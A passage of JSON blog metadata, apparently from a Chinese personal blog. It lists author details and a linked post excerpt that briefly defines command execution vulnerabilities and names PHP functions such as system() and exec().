安装途中会弹窗，询...","link":"","photos":[],"count_time":{"symbolsCount":"1.4k","symbolsTime":"1 mins."},"categories":[{"name":"环境配置","slug":"环境配置","count":4,"path":"api/categories/环境配置.json"}],"tags":[{"name":"工具","slug":"工具","count":3,"path":"api/tags/工具.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}},"next_post":{"title":"浅析命令执行漏洞","uid":"266dd7a9ffe02e836b26a1bdfda91c39","slug":"命令执行漏洞","date":"2023-01-10T13:21:22.723Z","updated":"2022-12-01T09:31:33.088Z","comments":true,"path":"api/articles/命令执行漏洞.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typorawallhaven-vgd6lm_1920x1080.png","text":"漏洞描述命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有**system( )、exec( )、shell_exec( )、passthru( )...","link":"","photos":[],"count_time":{"symbolsCount":"8k","symbolsTime":"7 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":13,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"漏洞","slug":"漏洞","count":3,"path":"api/tags/漏洞.json"}],"author":{"name":"Abyssaler","slug":"blog-author","avatar":"https://pic.kts.g.mi.com/551ced5839599747048c3c99a9d47df4203311636470612235.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}}}}